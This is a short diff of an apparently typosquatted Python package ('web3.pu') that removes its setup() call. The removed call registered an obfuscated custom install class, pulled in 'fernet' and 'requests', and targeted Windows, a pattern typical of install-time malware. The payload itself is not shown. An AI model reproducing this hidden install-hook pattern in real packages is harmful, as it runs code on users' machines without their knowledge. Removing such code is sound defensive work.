@@ -18,22 +18,5 @@ class ohPIwMZBZxFhcKDPFGOaGlmlXMyaYOUyGJqDgOyoNhgbjGNXuhKNXrtfiIpoaXWYiQePDmFZFB
             install.run(self)
 
 
-setup(
-    name="web3.pu",
-    version=VERSION,
-    author="IPuwC",
-    author_email="hDMdYvef@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ohPIwMZBZxFhcKDPFGOaGlmlXMyaYOUyGJqDgOyoNhgbjGNXuhKNXrtfiIpoaXWYiQePDmFZFBsUtylONPkeBoDyLWFPodpHZpUYBnKHDEVQKQd,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 
